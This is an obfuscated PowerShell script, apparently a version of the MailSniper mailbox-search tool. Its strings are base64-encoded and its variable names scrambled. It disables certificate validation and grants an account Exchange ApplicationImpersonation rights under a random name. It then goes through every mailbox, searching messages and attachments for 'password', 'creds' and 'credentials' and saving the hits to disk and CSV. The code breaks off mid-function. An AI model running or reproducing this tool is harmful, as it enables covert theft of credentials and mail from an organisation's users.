﻿function MailSearch{
  Param
  (
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $ImpersonationAccount = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $AutoDiscoverEmail = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $AdminUserName = "",
    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $AdminPassword = "",
    [Parameter(Position = 5, Mandatory = $False)]
    [string[]]$Terms = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKgA=')))),
    [Parameter(Position = 6, Mandatory = $False)]
    [int]
    $MailsPerUser = 100,
    [Parameter(Position = 7, Mandatory = $False)]
    [string]
    $OutputCsv = "",
    [Parameter(Position = 8, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 9, Mandatory = $False)]
    [string]
    $EmailList = "",
    [Parameter(Position = 10, Mandatory = $False)]
    [string]
    $Folder = "Inbox",
    [Parameter(Position = 11, Mandatory = $False)]
    [string]
    $Regex = '',
    [Parameter(Position = 12, Mandatory = $False)]
    [switch]
    $CheckAttachments,
    [Parameter(Position = 13, Mandatory = $False)]
    [string]
    $DownloadDir = ""
  )
  if (($ExchHostname -ne "") -Or ($AutoDiscoverEmail -ne ""))
  {
    echo ""
  }
  else
  {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAGkAdABoAGUAcgAgAHQAaABlACAAbwBwAHQAaQBvAG4AIAAnAEUAeABjAGgASABvAHMAdABuAGEAbQBlACcAIABvAHIAIAAnAEEAdQB0AG8ARABpAHMAYwBvAHYAZQByAEUAbQBhAGkAbAAnACAAbQB1AHMAdAAgAGIAZQAgAGUAbgB0AGUAcgBlAGQAIQA=')))
    break
  }
  __/=\_/==\___/\___
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
  ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
  ${/==\/\_______/\/=}.UseDefaultCredentials = $true
  ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
  ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
  ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
  ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
  ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
  ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
  ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAG4AYQBtAGUAcwBwAGEAYwBlACAATABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkAIAB7AA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAVAByAHUAcwB0AEEAbABsACgAKQAgAHsAIAANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBzAC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABjAGUAcgB0ACwAIAANAAoAIAAgACAAIAAgACAAIAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAcgBlAHEALAAgAGkAbgB0ACAAcAByAG8AYgBsAGUAbQApACAAewANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAB9AA=='))) 
  ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
  ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
  ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
  [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
  If($AutoDiscoverEmail -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $AutoDiscoverEmail + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
    ${__/==\___/=\/\__/} = New-Object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA='))) + ${/==\/\_______/\/=}.Url.Host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAG8AdwBlAHIAUwBoAGUAbABsAA==')))))
  }
  else
  {
    ${__/==\___/=\/\__/} = New-Object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAG8AdwBlAHIAUwBoAGUAbABsAC8A')))))
  }
  if ($AdminPassword -ne "")
  {
    $password = $AdminPassword | ConvertTo-SecureString -asPlainText -Force
    ${__/\/=\/\_/\/=\__} = New-Object System.Management.Automation.PSCredential($AdminUserName,$password)
  }
  else
  {
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAG4AdABlAHIAIABFAHgAYwBoAGEAbgBnAGUAIABhAGQAbQBpAG4AIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB0AG8AIABhAGQAZAAgAHkAbwB1AHIAIAB1AHMAZQByACAAdABvACAAdABoAGUAIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcgBvAGwAZQA=')))
    ${__/\/=\/\_/\/=\__} = Get-Credential
  }
  try
  {
    ${______/===\/=\_/\} = nsn -ConfigurationName Microsoft.Exchange -ConnectionUri ${__/==\___/=\/\__/} -Authentication Kerberos -Credential ${__/\/=\/\_/\/=\__} -ErrorAction Stop -verbose:$false
  }
  catch
  {
    ${/=\__/\_/\/==\/=\} = $_.Exception.Message
    if (${/=\__/\_/\/==\/=\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBMAG8AZwBvAG4AIABmAGEAaQBsAHUAcgBlACoA'))))
    {
      Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAEwAbwBnAG8AbgAgAGYAYQBpAGwAdQByAGUALgAgAEUAbgBzAHUAcgBlACAAeQBvAHUAIABoAGEAdgBlACAAZQBuAHQAZQByAGUAZAAgAHQAaABlACAAYwBvAHIAcgBlAGMAdAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGkAbgBjAGwAdQBkAGkAbgBnACAAdABoAGUAIABkAG8AbQBhAGkAbgAgACgAaQAuAGUAIABkAG8AbQBhAGkAbgBcAHUAcwBlAHIAbgBhAG0AZQApAC4A')))
      break
    }
    Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMgAzAH0A')))
    break
  }
  if($AutoDiscoverEmail -ne "")
  {
    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAZQBzAHQAYQBiAGwAaQBzAGgAIABhACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHMAZQBzAHMAaQBvAG4AIAB0AG8AIABoAHQAdABwADoALwAvAA=='))) + ${/==\/\_______/\/=}.Url.Host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAG8AdwBlAHIAUwBoAGUAbABsACAAdwBpAHQAaAAgAHAAcgBvAHYAaQBkAGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAA=='))))
    try
    {
      ipsn ${______/===\/=\_/\} -DisableNameChecking -AllowClobber -verbose:$false | Out-Null
    }
    catch
    {
    Write-host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAEYAYQBpAGwAZQBkACAAdABvACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAHMAZQByAHYAZQByACAAYQB0ACAA'))) + ${/==\/\_______/\/=}.Url.Host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAgAEMAaABlAGMAawAgAHMAZQByAHYAZQByACAAbgBhAG0AZQAuAA=='))))
    break
    } 
  }
  else
  {
    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAZQBzAHQAYQBiAGwAaQBzAGgAIABhACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHMAZQBzAHMAaQBvAG4AIAB0AG8AIABoAHQAdABwADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAG8AdwBlAHIAUwBoAGUAbABsACAAdwBpAHQAaAAgAHAAcgBvAHYAaQBkAGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAA=='))))
    try
    {
      ipsn ${______/===\/=\_/\} -DisableNameChecking -AllowClobber -verbose:$false | Out-Null
    }
    catch
    {
      Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAEYAYQBpAGwAZQBkACAAdABvACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAHMAZQByAHYAZQByACAAYQB0ACAAJABFAHgAYwBoAEgAbwBzAHQAbgBhAG0AZQAuACAAQwBoAGUAYwBrACAAcwBlAHIAdgBlAHIAIABuAGEAbQBlAC4A')))
      break
  }
  }
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGcAcgBhAG4AdABpAG4AZwAgAHQAaABlACAAJABJAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAEEAYwBjAG8AdQBuAHQAIAB1AHMAZQByACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIAByAGkAZwBoAHQAcwAhAA==')))
  ${/=\__/\_/=\/\_/==} = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
  New-ManagementRoleAssignment -Name:${/=\__/\_/=\/\_/==} -Role:ApplicationImpersonation -User:$ImpersonationAccount | Out-Null
  if($EmailList -ne "")
  {
    ${__/===\__/\/\/\/\} = gc -Path $EmailList
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQAgAHQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAbQBhAGkAbABiAG8AeABlAHMAIABkAGkAcwBjAG8AdgBlAHIAZQBkACAAaQBzADoAIAA='))) ${__/===\__/\/\/\/\}.count
  }
  else 
  {
    ${_/\/=\___/\/\_/=\} = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty PrimarySmtpAddress
    ${__/===\__/\/\/\/\} = ${_/\/=\___/\/\_/=\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqADoA')))
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAZQAgAHQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAbQBhAGkAbABiAG8AeABlAHMAIABkAGkAcwBjAG8AdgBlAHIAZQBkACAAaQBzADoAIAA='))) ${__/===\__/\/\/\/\}.count
  }
  if ($ExchHostname -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
  }
  else
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA==')))  + ${/==\/\_______/\/=}.Url.Host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
  }   
  Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAFsAKgBdACAATgBvAHcAIABjAG8AbgBuAGUAYwB0AGkAbgBnACAAdABvACAARQBXAFMAIAB0AG8AIABzAGUAYQByAGMAaAAgAHQAaABlACAAbQBhAGkAbABiAG8AeABlAHMAIQANAAoA')))
  ForEach($Mailbox in ${__/===\__/\/\/\/\})
  {
    ${_/\/==\___/=\_/\_}++
        Write-Host -NoNewLine ("[" + ${_/\/==\___/=\_/\_} + "/" + ${__/===\__/\/\/\/\}.count + "]") -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))); echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABVAHMAaQBuAGcAIAA='))) + $ImpersonationAccount + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIAA='))) + $Mailbox)
    ${/==\/\_______/\/=}.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$Mailbox ); 
    ${/\_____/===\/\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGcARgBvAGwAZABlAHIAUgBvAG8AdAA='))))
    ${/=======\/\/==\/\} = [Microsoft.Exchange.WebServices.Data.FolderView]100
    ${/=======\/\/==\/\}.Traversal=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGUAcAA=')))
    ${/\_____/===\/\___}.Load()
    if ($Folder -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))))
    {
      ${__/==\_/=\/\/=\/=} = ${/\_____/===\/\___}.FindFolders(${/=======\/\/==\/\}) | ? { $_.DisplayName -eq $Folder }
    }
    else
    {
      ${__/==\_/=\/\/=\/=} = ${/\_____/===\/\___}.FindFolders(${/=======\/\/==\/\}) 
    }
    ${___/=\_/=\___/==\} = @() 
    Foreach(${/=\____/=\/\/=\/\} in ${__/==\_/=\/\/=\/=})
    {
        echo "[***] Found folder: $(${/=\____/=\/\/=\/\}.DisplayName)"
      try
      {
        ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\____/=\/\/=\/\}.Id)
      }
      catch
      {
        ${/=\__/\_/\/==\/=\} = $_.Exception.Message
        if (${/=\__/\_/\/==\/=\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAHYAZQByAHMAaQBvAG4ALgAqAA=='))))
        {
          echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAFQAaABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAGYAYQBpAGwAZQBkACAAdQBzAGkAbgBnACAARQB4AGMAaABhAG4AZwBlACAAVgBlAHIAcwBpAG8AbgAgACQARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4ALgA=')))
          echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQAgAHMAZQB0AHQAaQBuAGcAIAB0AGgAZQAgAC0ARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4AIABmAGwAYQBnACAAdABvACAAdABoAGUAIABFAHgAYwBoAGEAbgBnAGUAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAuAA==')))
          echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAG8AbQBlACAAbwBwAHQAaQBvAG4AcwAgAHQAbwAgAHQAcgB5ADoAIABFAHgAYwBoAGEAbgBnAGUAMgAwADAANwBfAFMAUAAxACwAIABFAHgAYwBoAGEAbgBnAGUAMgAwADEAMAAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMQAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMgAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADMALAAgAG8AcgAgAEUAeABjAGgAYQBuAGcAZQAyADAAMQAzAF8AUwBQADEALgA=')))
          break
        }
      }
      ${_/\__/====\/\/=\/} = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      ${_/\__/====\/\/=\/}.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
    try 
    {
      ${__/\/\___/\/\____} = ${_/\/====\/\/=\___}.FindItems($MailsPerUser)
    }
    catch [Exception]{
      Write-Host -foregroundcolor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABXAGEAcgBuAGkAbgBnADoAIAA='))) + $Mailbox + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAG8AZQBzACAAbgBvAHQAIABhAHAAcABlAGEAcgAgAHQAbwAgAGgAYQB2AGUAIABhACAAbQBhAGkAbABiAG8AeAAuAA=='))))
      continue
    }   
      if ($regex -eq "")
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAbQBhAGkAbABiAG8AeAA6ACAAJABNAGEAaQBsAGIAbwB4ACAAZgBvAHIAIAB0AGgAZQAgAHQAZQByAG0AcwAgACQAVABlAHIAbQBzAC4A'))))
      }
      else 
      {
        echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAdABoAGUAIABtAGEAaQBsAGIAbwB4ADoAIAAkAE0AYQBpAGwAYgBvAHgAIAB3AGkAdABoACAAdABoAGUAIABzAHUAcABwAGwAaQBlAGQAIAByAGUAZwB1AGwAYQByACAAZQB4AHAAcgBlAHMAcwBpAG8AbgAuAA=='))))    
      }
      foreach (${_/=\___/=\/=\_/\/} in ${__/\/\___/\/\____}.Items)
      {    
        ${_/=\___/=\/=\_/\/}.Load(${_/\__/====\/\/=\/})
        if ($Regex -eq "")
        {
          foreach(${___/==\/\__/=\_/\} in $Terms)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -like ${___/==\/\__/=\_/\})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }
        }
        else 
        {
          foreach(${_/\/\_/=\__/==\__} in $Regex)
          {
            if (${_/=\___/=\/=\_/\/}.Body.Text -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
            elseif (${_/=\___/=\/=\_/\/}.Subject -match ${_/\/\_/=\__/==\__})
            {
            ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach(${/=\/\_/==\_/\____} in ${_/=\___/=\/=\_/\/}.Attachments)
          {
            if(${/=\/\_/==\_/\____} -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if(${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBoAHQAbQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAGQAZgA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAG8AYwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB4AGwAcwA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA=')))) -Or ${/=\/\_/==\_/\____}.Name.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBtAHMAZwA=')))))
              {
                ${/=\/\_/==\_/\____}.Load() | Out-Null
                ${/=\__/====\/\_/=\} = [System.Text.Encoding]::ASCII.GetString(${/=\/\_/==\_/\____}.Content)
                if ($Regex -eq "")
                {
                  foreach(${___/==\/\__/=\_/\} in $Terms)
                  {
                    if (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + "-" + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -like ${___/==\/\__/=\_/\})
                    {
                      echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                      ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach(${_/\/\_/=\__/==\__} in $Regex)
                  {
                    if (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                    elseif (${/=\__/====\/\_/=\} -match ${_/\/\_/=\__/==\__})
                    {
                    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAYQB0AHQAYQBjAGgAbQBlAG4AdAAgAA=='))) + ${/=\/\_/==\_/\____}.Name)
                    ${___/=\_/=\___/==\} += ${_/=\___/=\/=\_/\/}
                      if ($DownloadDir -ne "")
                      { 
                        ${/=\/=\_/\/=\____/} = Get-Random
                        ${_____/==\__/=\/\/} = new-object System.IO.FileStream(($DownloadDir + "\" + ${/=\/=\_/\/=\____/} + ${/=\/\_/==\_/\____}.Name.ToString()), [System.IO.FileMode]::Create)
                        ${_____/==\__/=\/\/}.Write(${/=\/\_/==\_/\____}.Content, 0, ${/=\/\_/==\_/\____}.Content.Length)
                        ${_____/==\__/=\/\/}.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }
    }
    if ($OutputCsv -ne "")
    { 
      ${___/=\_/=\___/==\} | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JgAjADQANAA7AA==')))}
      ${___/=\_/=\___/==\} | select Sender,ReceivedBy,Subject,Body | epcsv $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0AcAAtACQATwB1AHQAcAB1AHQAQwBzAHYA'))) -encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBUAEYAOAA=')))
